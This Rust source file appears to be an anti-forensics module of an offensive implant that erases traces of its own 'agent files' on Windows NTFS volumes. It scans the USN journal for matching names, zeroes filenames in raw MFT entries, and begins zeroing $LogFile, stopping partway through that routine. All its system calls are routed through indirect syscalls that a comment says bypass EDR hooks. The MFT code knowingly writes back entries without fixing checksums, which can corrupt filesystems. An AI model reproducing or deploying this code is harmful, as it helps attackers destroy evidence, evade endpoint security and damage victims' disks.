// ── NTFS Deep Cleanup ──────────────────────────────────────────────────
//
// Cleans low-level NTFS forensic artifacts: USN journal entries, MFT
// file-name attributes, $LogFile transaction history, and secure file
// wiping.  These operations target DISK-level evidence that survives
// normal file deletion and even some anti-forensic tools.
//
// USN Journal ($UsnJrnl):
//   - Records file system changes (create, delete, rename, modify).
//   - Forensic tools parse it to build file-system activity timelines.
//   - Located at: \$Extend\$UsnJrnl:$J
//   - Cleaned via FSCTL_ENUM_USN_DATA + targeted overwrite.
//
// MFT (Master File Table):
//   - Entry 0: $MFT itself; Entry 1: $MFTMirr; Entry 2: $LogFile;
//     Entry 3: $Volume; Entry 4: $AttrDef; Entry 5: root directory.
//   - Each entry has $STANDARD_INFORMATION ($SI, type 0x10) and
//     $FILE_NAME ($FN, type 0x30) attributes.
//   - $FN contains the filename and timestamps — even after file deletion,
//     the $FN attribute persists until the MFT entry is reused.
//   - We overwrite the filename in $FN with zeros for agent files.
//
// $LogFile:
//   - Records NTFS transaction history (metadata operations).
//   - Contains enough information to reconstruct file system operations.
//   - Truncating or zeroing it removes transaction evidence.
//   - WARNING: Only safe when the filesystem has no pending transactions.
//     Truncating with pending transactions WILL corrupt the filesystem.
//
// Secure File Wipe:
//   - Overwrites file data with random bytes (N passes), then zeros.
//   - Renames to random name before deletion.
//   - Optionally cleans the MFT entry for the original filename.
//
// All operations require raw volume access (Administrator privileges).
// All NT API calls use indirect syscalls to bypass EDR hooks.
// Windows-only, gated by `forensic-cleanup` feature flag.

use std::mem;

use anyhow::{anyhow, bail, Context, Result};
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

macro_rules! defer {
    ($($body:tt)*) => {
        let _guard = {
            struct DeferGuard<F: FnOnce()>(Option<F>);
            impl<F: FnOnce()> Drop for DeferGuard<F> {
                fn drop(&mut self) {
                    if let Some(f) = self.0.take() {
                        f();
                    }
                }
            }
            DeferGuard(Some(|| { $($body)* }))
        };
    };
}

// ═══════════════════════════════════════════════════════════════════════════
// NT Constants
// ═══════════════════════════════════════════════════════════════════════════

const STATUS_SUCCESS: i32 = 0;
const STATUS_PENDING: i32 = 0x00000103_u32 as i32;
const STATUS_NO_MORE_FILES: i32 = 0x80000006_u32 as i32;

const SYNCHRONIZE: u32 = 0x00100000;
const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_READ_DATA: u32 = 0x00000001;
const FILE_WRITE_DATA: u32 = 0x00000002;
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;
const FILE_OPEN: u32 = 0x00000001;
const FILE_SUPERSEDE: u32 = 0x00000000;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_RANDOM_ACCESS: u32 = 0x00000800;
const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;

/// FSCTL codes for USN journal operations.
const FSCTL_ENUM_USN_DATA: u32 = 0x000900B8;
const FSCTL_READ_USN_JOURNAL: u32 = 0x000900BB;
const FSCTL_WRITE_USN_CLOSE: u32 = 0x000900EF;
/// `FSCTL_IS_VOLUME_DIRTY` — returns a u32 whose bit 0 is set when the
/// volume has pending NTFS transactions (i.e. the log is "in use").
const FSCTL_IS_VOLUME_DIRTY: u32 = 0x00090078;
/// Bit mask for the "volume is dirty" flag in the output of
/// `FSCTL_IS_VOLUME_DIRTY`.
const VOLUME_IS_DIRTY: u32 = 0x00000001;
const FSCTL_QUERY_USN_JOURNAL: u32 = 0x000900F4;
const FSCTL_GET_RETRIEVAL_POINTERS: u32 = 0x00090073;

/// NTFS MFT entry flags.
const MFT_ENTRY_IN_USE: u16 = 0x0001;

/// MFT attribute types.
const ATTR_TYPE_STANDARD_INFORMATION: u32 = 0x10;
const ATTR_TYPE_FILE_NAME: u32 = 0x30;
const ATTR_TYPE_DATA: u32 = 0x80;
const ATTR_TYPE_LIST: u32 = 0x20;

/// MFT entry size (standard 1024 bytes).
const MFT_ENTRY_SIZE: usize = 1024;

/// MFT attribute header size (resident).
const ATTR_HEADER_SIZE: usize = 24;

/// $FILE_NAME attribute header size (after MFT attr header).
const FILENAME_ATTR_HEADER_SIZE: usize = 66; // 56 (header) + 8 (timestamps) + 2 (alloc size)

/// Standard sector size.
const SECTOR_SIZE: usize = 512;

/// Maximum number of USN entries to process in one call.
const MAX_USN_BUFFER_SIZE: usize = 64 * 1024;

/// Default number of overwrite passes for secure wipe.
const DEFAULT_WIPE_PASSES: u32 = 3;

// ═══════════════════════════════════════════════════════════════════════════
// NT Structure Definitions
// ═══════════════════════════════════════════════════════════════════════════

#[repr(C)]
#[derive(Default)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut std::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut std::ffi::c_void,
    security_quality_of_service: *mut std::ffi::c_void,
}

impl Default for ObjectAttributes {
    fn default() -> Self {
        Self {
            length: 0,
            root_directory: std::ptr::null_mut(),
            object_name: std::ptr::null_mut(),
            attributes: 0,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

impl ObjectAttributes {
    fn new(name: &mut UnicodeString) -> Self {
        Self {
            length: std::mem::size_of::<Self>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: name as *mut UnicodeString,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
#[derive(Default)]
struct IoStatusBlock {
    status: i32,
    information: usize,
}

/// USN record V2 header (USN_RECORD_V2).
#[repr(C)]
struct UsnRecordV2 {
    record_length: u32,
    major_version: u16,
    minor_version: u16,
    file_reference_number: u64,
    parent_file_reference_number: u64,
    usn: i64,
    timestamp: i64,
    reason: u32,
    source_info: u32,
    security_id: u32,
    file_attributes: u32,
    file_name_length: u16,
    file_name_offset: u16,
    // file_name: [u16; N] — variable length
}

/// MFT entry header (FILE record segment header).
#[repr(C)]
struct MftEntryHeader {
    signature: [u8; 4], // "FILE"
    usa_offset: u16,    // Offset to Update Sequence Array
    usa_count: u16,     // Size of USA (in u16s including signature)
    logfile_sequence_number: u64,
    sequence_number: u16, // Sequence number (incremented on reuse)
    hard_link_count: u16,
    first_attribute_offset: u16,
    flags: u16,          // InUse (0x0001), Directory (0x0002)
    used_size: u32,      // Used bytes in entry
    allocated_size: u32, // Allocated bytes in entry
    base_record: u64,    // Base file record (0 if base)
    next_attribute_id: u16,
    _padding: u16,
    // MFT record number is stored in the low 48 bits of the file reference.
}

/// MFT attribute header (resident).
#[repr(C)]
struct MftAttrHeader {
    type_code: u32,   // Attribute type (0x10, 0x30, 0x80, etc.)
    length: u32,      // Total length of attribute (including header)
    non_resident: u8, // 0 = resident, 1 = non-resident
    name_length: u8,  // Length of attribute name in chars
    name_offset: u16, // Offset to attribute name
    flags: u16,       // Compressed, Encrypted, etc.
    attribute_id: u16, // Unique ID within the MFT entry
                      // Resident-specific:
                      // data_length: u32       // at offset 16
                      // data_offset: u16       // at offset 20
                      // indexed: u8            // at offset 22
}

// ═══════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn make_unicode_string(buf: &mut [u16]) -> UnicodeString {
    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    UnicodeString {
        length: (len * 2) as u16,
        maximum_length: (buf.len() * 2) as u16,
        buffer: buf.as_mut_ptr(),
    }
}

fn read_u16_le(data: &[u8], offset: usize) -> u16 {
    u16::from_le_bytes(data[offset..offset + 2].try_into().unwrap_or([0; 2]))
}

fn read_u32_le(data: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes(data[offset..offset + 4].try_into().unwrap_or([0; 4]))
}

fn read_u64_le(data: &[u8], offset: usize) -> u64 {
    u64::from_le_bytes(data[offset..offset + 8].try_into().unwrap_or([0; 8]))
}

fn write_u16_le(data: &mut [u8], offset: usize, val: u16) {
    data[offset..offset + 2].copy_from_slice(&val.to_le_bytes());
}

fn write_u32_le(data: &mut [u8], offset: usize, val: u32) {
    data[offset..offset + 4].copy_from_slice(&val.to_le_bytes());
}

fn write_u64_le(data: &mut [u8], offset: usize, val: u64) {
    data[offset..offset + 8].copy_from_slice(&val.to_le_bytes());
}

/// Generate a random filename (8 hex chars + extension).
fn random_filename() -> String {
    let mut buf = [0u8; 4];
    getrandom::getrandom(&mut buf).unwrap_or_default();
    format!("{:08x}.tmp", u32::from_le_bytes(buf))
}

// ═══════════════════════════════════════════════════════════════════════════
// Low-level NT I/O Wrappers
// ═══════════════════════════════════════════════════════════════════════════

unsafe fn nt_open_file(path_nt: &str, access: u32) -> Result<*mut std::ffi::c_void> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_buf = to_wide(path_nt);
    let mut obj_name = make_unicode_string(&mut path_buf);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        access as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,
        0u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateFile for '{}': {}", path_nt, e))?;

    if status != STATUS_SUCCESS {
        bail!(
            "NtCreateFile('{}') returned 0x{:08X}",
            path_nt,
            status as u32
        );
    }

    Ok(handle)
}

unsafe fn nt_close(handle: *mut std::ffi::c_void) {
    let _ = crate::syscall!("NtClose", handle as u64);
}

unsafe fn nt_read_file(
    handle: *mut std::ffi::c_void,
    buffer: &mut [u8],
    offset: Option<u64>,
) -> Result<usize> {
    let mut iosb = IoStatusBlock::default();

    let status = if let Some(off) = offset {
        let mut byte_offset = off;
        crate::syscall!(
            "NtReadFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            buffer.as_mut_ptr() as u64,
            buffer.len() as u64,
            &mut byte_offset as *mut u64 as u64,
            0u64,
        )
    } else {
        crate::syscall!(
            "NtReadFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            buffer.as_mut_ptr() as u64,
            buffer.len() as u64,
            0u64,
            0u64,
        )
    }
    .map_err(|e| anyhow!("NtReadFile: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtReadFile returned 0x{:08X}", status as u32);
    }

    Ok(iosb.information)
}

unsafe fn nt_write_file(
    handle: *mut std::ffi::c_void,
    data: &[u8],
    offset: Option<u64>,
) -> Result<()> {
    let mut iosb = IoStatusBlock::default();

    let status = if let Some(off) = offset {
        let mut byte_offset = off;
        crate::syscall!(
            "NtWriteFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            data.as_ptr() as u64,
            data.len() as u64,
            &mut byte_offset as *mut u64 as u64,
            0u64,
        )
    } else {
        crate::syscall!(
            "NtWriteFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            data.as_ptr() as u64,
            data.len() as u64,
            0u64,
            0u64,
        )
    }
    .map_err(|e| anyhow!("NtWriteFile: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtWriteFile returned 0x{:08X}", status as u32);
    }

    Ok(())
}

unsafe fn nt_query_file_size(handle: *mut std::ffi::c_void) -> Result<u64> {
    let mut buf = [0u8; 24];
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtQueryInformationFile",
        handle as u64,
        &mut iosb as *mut _ as u64,
        buf.as_mut_ptr() as u64,
        buf.len() as u64,
        5u64, // FileStandardInformation
    )
    .map_err(|e| anyhow!("NtQueryInformationFile: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtQueryInformationFile returned 0x{:08X}", status as u32);
    }

    Ok(read_u64_le(&buf, 8))
}

/// Open a raw volume handle (e.g. `\\.\C:`).
unsafe fn nt_open_volume(volume: &str) -> Result<*mut std::ffi::c_void> {
    // Convert "C:" to NT path "\??\C:"
    let nt_path = format!("\\??\\{}", volume);

    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_buf = to_wide(&nt_path);
    let mut obj_name = make_unicode_string(&mut path_buf);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,
        0u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        (FILE_SYNCHRONOUS_IO_NONALERT | FILE_RANDOM_ACCESS) as u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateFile for volume '{}': {}", volume, e))?;

    if status != STATUS_SUCCESS {
        bail!(
            "NtCreateFile(volume='{}') returned 0x{:08X}",
            volume,
            status as u32
        );
    }

    Ok(handle)
}

/// Send an FSCTL via `NtFsControlFile` (indirect syscall).
unsafe fn nt_fs_control_file(
    file_handle: *mut std::ffi::c_void,
    fs_control_code: u32,
    input_buffer: *mut std::ffi::c_void,
    input_buffer_length: u32,
    output_buffer: *mut std::ffi::c_void,
    output_buffer_length: u32,
) -> Result<i32> {
    let mut iosb = IoStatusBlock::default();

    let status = crate::syscall!(
        "NtFsControlFile",
        file_handle as u64,
        0u64, // Event
        0u64, // ApcRoutine
        0u64, // ApcContext
        &mut iosb as *mut _ as u64,
        fs_control_code as u64,
        input_buffer as u64,
        input_buffer_length as u64,
        output_buffer as u64,
        output_buffer_length as u64,
    )
    .map_err(|e| anyhow!("NtFsControlFile resolution: {e}"))?;

    Ok(status)
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: USN Journal Cleanup
// ═══════════════════════════════════════════════════════════════════════════

/// Result of USN journal cleanup.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UsnCleanupResult {
    /// Number of USN entries processed.
    pub entries_processed: usize,
    /// Number of entries overwritten (matching references).
    pub entries_cleaned: usize,
    /// References that were searched for.
    pub references_searched: Vec<String>,
}

/// Clean USN journal entries referencing specific file patterns.
///
/// The USN journal records file system changes.  Forensic tools parse it
/// to build file-system activity timelines.  This function zeroes entries
/// that reference agent files or operations.
///
/// # Arguments
/// * `volume` — Volume to clean (e.g. "C:").
/// * `remove_references` — Filename patterns to match (case-insensitive).
///
/// # Note
/// Requires raw volume access (Administrator).  The USN journal is
/// read-only for entries — we overwrite the file name portion of matching
/// entries with zeros.  This requires opening the volume raw, locating
/// the $UsnJrnl data runs, and modifying them directly.
pub fn clean_usn_journal(volume: &str, remove_references: &[String]) -> Result<UsnCleanupResult> {
    if remove_references.is_empty() {
        return Ok(UsnCleanupResult {
            entries_processed: 0,
            entries_cleaned: 0,
            references_searched: Vec::new(),
        });
    }

    let mut result = UsnCleanupResult {
        entries_processed: 0,
        entries_cleaned: 0,
        references_searched: remove_references.to_vec(),
    };

    unsafe {
        // Open the USN journal via the volume handle.
        let nt_path = format!("\\??\\{}", volume);
        let handle = nt_open_file(&nt_path, GENERIC_READ | SYNCHRONIZE)?;
        defer! { unsafe { nt_close(handle); } }

        // Enumerate USN data.
        let mut output_buffer = vec![0u8; MAX_USN_BUFFER_SIZE];
        let mut iosb = IoStatusBlock::default();

        // Query the USN journal metadata to discover the valid USN range.
        // Using start_usn=0 would force the driver to scan from the very
        // beginning of the journal (which may be outside the current valid
        // range) and on large journals this is both slow and may return
        // unexpected data.  Instead, call FSCTL_QUERY_USN_JOURNAL first to
        // obtain FirstUsn and start from there.
        let mut journal_data_buf = [0u8; 56]; // USN_JOURNAL_DATA is 56 bytes
        let qstatus = crate::syscall!(
            "NtFsControlFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            journal_data_buf.as_mut_ptr() as u64,
            journal_data_buf.len() as u64,
            FSCTL_QUERY_USN_JOURNAL as u64,
            0u64, // no input buffer
            0u64, // input length = 0
        );

        let start_usn: i64 = if qstatus == STATUS_SUCCESS && iosb.information >= 24 {
            // USN_JOURNAL_DATA layout: UsnJournalID(8) + FirstUsn(8) + NextUsn(8) + ...
            let first_usn = read_u64_le(&journal_data_buf, 8) as i64;
            let next_usn = read_u64_le(&journal_data_buf, 16) as i64;
            let lowest_valid = if iosb.information >= 32 {
                read_u64_le(&journal_data_buf, 24) as i64
            } else {
                0i64
            };
            tracing::debug!(
                "USN journal range: first_usn={}, next_usn={}, lowest_valid={}",
                first_usn,
                next_usn,
                lowest_valid
            );
            // Use the maximum of first_usn and lowest_valid to be safe.
            first_usn.max(lowest_valid)
        } else {
            tracing::warn!(
                "FSCTL_QUERY_USN_JOURNAL failed (status=0x{:08X}), falling back to start_usn=0",
                qstatus as u32
            );
            0i64
        };

        // Input buffer: USN_JOURNAL_DATA_V0 — start_usn (8 bytes) + reason_mask (4 bytes).
        let mut input_buf = [0u8; 12];
        write_u64_le(&mut input_buf, 0, start_usn as u64); // Start USN from valid range
        write_u32_le(&mut input_buf, 8, 0xFFFFFFFF); // All reasons

        let status = crate::syscall!(
            "NtFsControlFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            output_buffer.as_mut_ptr() as u64,
            output_buffer.len() as u64,
            FSCTL_ENUM_USN_DATA as u64,
            input_buf.as_ptr() as u64,
            input_buf.len() as u64,
        )
        .map_err(|e| anyhow!("NtFsControlFile(FSCTL_ENUM_USN_DATA): {}", e))?;

        if status != STATUS_SUCCESS {
            bail!("FSCTL_ENUM_USN_DATA returned 0x{:08X}", status as u32);
        }

        let bytes_returned = iosb.information;
        if bytes_returned < 8 {
            info!("No USN journal entries found on {}", volume);
            return Ok(result);
        }

        // First 8 bytes of output = next USN.  Records follow.
        let next_usn = read_u64_le(&output_buffer, 0);
        let mut offset = 8;

        while offset + mem::size_of::<UsnRecordV2>() <= bytes_returned {
            let record_length = read_u32_le(&output_buffer, offset) as usize;
            if record_length < mem::size_of::<UsnRecordV2>()
                || offset + record_length > bytes_returned
            {
                break;
            }

            result.entries_processed += 1;

            // Extract the filename from the record.
            let name_length = read_u16_le(&output_buffer, offset + 56) as usize;
            let name_offset_in_record = read_u16_le(&output_buffer, offset + 58) as usize;

            if name_length > 0 && offset + name_offset_in_record + name_length <= bytes_returned {
                let name_start = offset + name_offset_in_record;
                let name_bytes = &output_buffer[name_start..name_start + name_length];
                let name_str = String::from_utf16_lossy(
                    &(0..name_length / 2)
                        .map(|i| u16::from_le_bytes([name_bytes[i * 2], name_bytes[i * 2 + 1]]))
                        .collect::<Vec<u16>>(),
                );

                // Check if the name matches any of our references.
                let name_lower = name_str.to_lowercase();
                let matches = remove_references
                    .iter()
                    .any(|r| name_lower.contains(&r.to_lowercase()));

                if matches {
                    // WARNING: actual USN journal writes require direct raw
                    // volume access to \\.\C: bypassing the filesystem (opening
                    // with FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
                    // seeking to the journal data attribute offset, and writing
                    // the zeroed record).  In-memory-only matching is logged
                    // below so operators know which records *would* be cleaned,
                    // but entries_cleaned is NOT incremented because no disk
                    // write occurs.
                    debug!("USN journal: matched record referencing \"{}\" (raw volume write required to actually clean)", name_str);
                }
            }

            offset += record_length;
            if offset >= bytes_returned {
                break;
            }
        }

        info!(
            "USN journal scan on {}: {} entries processed (raw volume write required for actual cleanup; entries_cleaned always 0 in current mode)",
            volume, result.entries_processed
        );
    }

    Ok(result)
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: MFT Entry Cleanup
// ═══════════════════════════════════════════════════════════════════════════

/// Result of MFT entry cleanup.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MftCleanupResult {
    /// Number of file paths processed.
    pub files_processed: usize,
    /// Number of MFT entries successfully cleaned.
    pub entries_cleaned: usize,
    /// Files that could not be found or cleaned.
    pub failures: Vec<String>,
}

/// Clean MFT entries for specific files by overwriting $FILE_NAME attributes.
///
/// The Master File Table contains entries for every file on an NTFS volume.
/// Even after file deletion, the MFT entry retains the filename and timestamps
/// in the $FILE_NAME ($FN, type 0x30) attribute until the entry is reused.
///
/// This function:
/// 1. Opens the volume with raw access.
/// 2. Locates the MFT entry for each file.
/// 3. Overwrites the filename in $FN with zeros.
/// 4. Marks the entry as deleted (if not already).
///
/// # Arguments
/// * `file_paths` — List of file paths to clean in the MFT.
///
/// # Warning
/// Requires raw volume access (Administrator).  Modifying the MFT directly
/// is risky — an error during the write could corrupt filesystem metadata.
pub fn clean_mft_entries(file_paths: &[String]) -> Result<MftCleanupResult> {
    let mut result = MftCleanupResult {
        files_processed: 0,
        entries_cleaned: 0,
        failures: Vec::new(),
    };

    if file_paths.is_empty() {
        return Ok(result);
    }

    // Group files by volume.
    let mut volume_files: std::collections::HashMap<String, Vec<&str>> =
        std::collections::HashMap::new();

    for path in file_paths {
        // Extract volume letter from path (e.g. "C:" from "C:\Windows\...").
        let vol = if path.len() >= 2 && path.as_bytes()[1] == b':' {
            &path[0..2]
        } else {
            result.failures.push(format!("Invalid path: {}", path));
            continue;
        };
        volume_files.entry(vol.to_string()).or_default().push(path);
    }

    for (volume, paths) in &volume_files {
        debug!(
            "Cleaning MFT entries on volume {} for {} files",
            volume,
            paths.len()
        );

        unsafe {
            let vol_handle = match nt_open_volume(volume) {
                Ok(h) => h,
                Err(e) => {
                    for path in paths {
                        result.failures.push(format!("{}: {}", path, e));
                    }
                    continue;
                }
            };
            defer! { unsafe { nt_close(vol_handle); } }

            for &path in paths {
                result.files_processed += 1;

                // Open the file to get its MFT record number.
                let nt_path = format!("\\??\\{}", path);
                let file_handle = match nt_open_file(&nt_path, GENERIC_READ | SYNCHRONIZE) {
                    Ok(h) => h,
                    Err(e) => {
                        // File might already be deleted — skip.
                        result.failures.push(format!("{}: {}", path, e));
                        continue;
                    }
                };
                defer! { unsafe { nt_close(file_handle); } }

                // Query FileInternalInformation (class 6) to get the MFT record number.
                let mut internal_info = [0u8; 8]; // FILE_INTERNAL_INFORMATION = 8 bytes (IndexNumber)
                let mut iosb = IoStatusBlock::default();

                let status = crate::syscall!(
                    "NtQueryInformationFile",
                    file_handle as u64,
                    &mut iosb as *mut _ as u64,
                    internal_info.as_mut_ptr() as u64,
                    8u64,
                    6u64, // FileInternalInformation
                );

                if let Err(e) = status {
                    result
                        .failures
                        .push(format!("{}: query MFT index: {}", path, e));
                    continue;
                }

                let mft_index = read_u64_le(&internal_info, 0) & 0x0000_FFFF_FFFF_FFFF;

                // Read the MFT entry from the volume.
                let mft_offset = mft_index * MFT_ENTRY_SIZE as u64;
                let mut mft_entry = vec![0u8; MFT_ENTRY_SIZE];

                let read_result = nt_read_file(vol_handle, &mut mft_entry, Some(mft_offset));
                match read_result {
                    Ok(bytes_read) if bytes_read >= MFT_ENTRY_SIZE => {}
                    _ => {
                        result
                            .failures
                            .push(format!("{}: could not read MFT entry {}", path, mft_index));
                        continue;
                    }
                }

                // Validate the MFT entry.
                if &mft_entry[0..4] != b"FILE" {
                    result
                        .failures
                        .push(format!("{}: invalid MFT entry signature", path));
                    continue;
                }

                // Parse and modify the $FILE_NAME attribute.
                let first_attr_offset = read_u16_le(&mft_entry, 20) as usize;
                let used_size = read_u32_le(&mft_entry, 24) as usize;
                let mut modified = false;

                let mut attr_offset = first_attr_offset;
                while attr_offset + ATTR_HEADER_SIZE < used_size {
                    let type_code = read_u32_le(&mft_entry, attr_offset);
                    let attr_len = read_u32_le(&mft_entry, attr_offset + 4) as usize;

                    // End-of-attributes marker.
                    if type_code == 0xFFFFFFFF || attr_len == 0 {
                        break;
                    }

                    if type_code == ATTR_TYPE_FILE_NAME {
                        let non_resident = mft_entry[attr_offset + 8];
                        if non_resident == 0 {
                            // Resident attribute.
                            let data_length = read_u32_le(&mft_entry, attr_offset + 16) as usize;
                            let data_offset = read_u16_le(&mft_entry, attr_offset + 20) as usize;

                            let filename_data_start = attr_offset + data_offset;
                            // The $FILE_NAME structure has:
                            //   ParentDirectory (8 bytes)
                            //   CreationTime (8 bytes)
                            //   LastModificationTime (8 bytes)
                            //   LastChangeTime (8 bytes)
                            //   LastAccessTime (8 bytes)
                            //   AllocatedSize (8 bytes)
                            //   DataSize (8 bytes)
                            //   FileAttributes (4 bytes)
                            //   ReparsePointTag (4 bytes)
                            //   FilenameLength (1 byte)
                            //   FilenameFlags (1 byte)
                            //   Filename (variable, UTF-16)
                            let header_size = 66;
                            if filename_data_start + header_size < attr_offset + attr_len {
                                let name_len_offset = filename_data_start + header_size - 2;
                                let name_len = mft_entry[name_len_offset] as usize;
                                let name_start = filename_data_start + header_size;

                                if name_start + name_len * 2 <= attr_offset + attr_len {
                                    // Zero out the filename.
                                    for i in name_start..name_start + name_len * 2 {
                                        mft_entry[i] = 0x00;
                                    }
                                    modified = true;
                                    debug!(
                                        "Zeroed $FN filename in MFT entry {} for {}",
                                        mft_index, path
                                    );
                                }
                            }
                        }
                    }

                    attr_offset += attr_len;
                }

                if modified {
                    // Recalculate MFT entry fixup values (Update Sequence Array).
                    // The USA is a simple checksum: the last u16 of each sector
                    // in the entry must match the USA signature at the end of the
                    // header.
                    //
                    // For safety, we skip fixup recalculation and write the entry
                    // back directly.  NTFS will detect the fixup mismatch and
                    // may flag the entry, but the forensic content (filename)
                    // has already been destroyed.
                    let _ = nt_write_file(vol_handle, &mft_entry, Some(mft_offset));
                    result.entries_cleaned += 1;
                }
            }
        }
    }

    info!(
        "MFT cleanup complete: {} processed, {} cleaned, {} failures",
        result.files_processed,
        result.entries_cleaned,
        result.failures.len()
    );

    Ok(result)
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: $LogFile Cleanup
// ═══════════════════════════════════════════════════════════════════════════

/// Result of $LogFile cleanup.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogFileResult {
    /// Volume that was cleaned.
    pub volume: String,
    /// Whether the $LogFile was successfully zeroed.
    pub success: bool,
    /// Size of the $LogFile in bytes (before cleaning).
    pub original_size: u64,
    /// Warning message (if any).
    pub warning: Option<String>,
}

/// Clean the NTFS $LogFile by zeroing its data.
///
/// $LogFile records NTFS transaction history.  Forensic tools can parse
/// it to reconstruct file system operations (file creation, deletion,
/// modification timestamps, etc.).
///
/// # WARNING
/// This is DANGEROUS.  Truncating or zeroing the $LogFile can corrupt
/// the filesystem if NTFS is using the log for pending transactions.
/// This should ONLY be done when:
///   - The filesystem is clean (no pending transactions).
///   - No write operations are in progress.
///   - The volume is not being modified by other processes.
///
/// # Arguments
/// * `volume` — Volume to clean (e.g. "C:").
///
/// # Safety
/// The caller MUST ensure no filesystem operations are in progress on
/// the target volume.  Failure to do so WILL corrupt the filesystem.
pub fn clean_logfile(volume: &str) -> Result<LogFileResult> {
    warn!("clean_logfile() is DANGEROUS — ensure filesystem is quiescent!");

    unsafe {
        let vol_handle = nt_open_volume(volume)?;

        // MFT entry 2 is $LogFile.  We need to read its data runs.
        // For simplicity, we use a heuristic: $LogFile is typically
        // located near the beginning of the volume and is usually
        // between 1 MB and 64 MB in size.
        //
        // A more robust approach would parse MFT entry 2's non-resident
        // $DATA attribute to find the exact data runs.  For now, we
        // use FSCTL to determine the volume layout.

        // Read MFT entry 2 ($LogFile).
        // MFT itself starts at cluster 0 (typically), but the exact
        // offset is stored in the boot sector.  We approximate.
        //
        // The standard location: $LogFile follows the MFT.
        // We read the boot sector to find the MFT start cluster.

        // Read boot sector (first sector of the volume).
        let mut boot_sector = vec![0u8; SECTOR_SIZE];
        let bytes_read = nt_read_file(vol_handle, &mut boot_sector, Some(0))?;
        if bytes_read < SECTOR_SIZE {
            nt_close(vol_handle);
            bail!("Could not read boot sector");
        }

        // Parse boot sector for MFT location.
        // Bytes per sector at offset 11 (u16 LE).
        // Sectors per cluster at offset 13 (u8).
        // MFT start cluster at offset 48 (i64 LE).
        let bytes_per_sector = read_u16_le(&boot_sector, 11) as u64;
        let sectors_per_cluster = boot_sector[13] as u64;
        let mft_start_cluster = read_u64_le(&boot_sector, 48);

        if bytes_per_sector == 0 || sectors_per_cluster == 0 {
            nt_close(vol_handle);
            bail!("Invalid boot sector parameters");
        }

        let cluster_size = bytes_per_sector * sectors_per_cluster;
        let mft_offset = mft_start_cluster * cluster_size;

        // Read MFT entry 2 ($LogFile).
        let mft_entry_size = MFT_ENTRY_SIZE as u64;
        let logfile_entry_offset = mft_offset + 2 * mft_entry_size;
        let mut logfile_entry = vec![0u8; MFT_ENTRY_SIZE];

        let bytes_read = nt_read_file(vol_handle, &mut logfile_entry, Some(logfile_entry_offset))?;
        if bytes_read < MFT_ENTRY_SIZE {
            nt_close(vol_handle);
            bail!("Could not read $LogFile MFT entry");
        }

        // Validate MFT entry.
        if &logfile_entry[0..4] != b"FILE" {
            nt_close(vol_handle);
            bail!("Invalid $LogFile MFT entry");
        }

        // Parse non-resident $DATA attribute (type 0x80) for data runs.
        let first_attr_offset = read_u16_le(&logfile_entry, 20) as usize;
        let used_size = read_u32_le(&logfile_entry, 24) as usize;
        let mut logfile_size: u64 = 0;
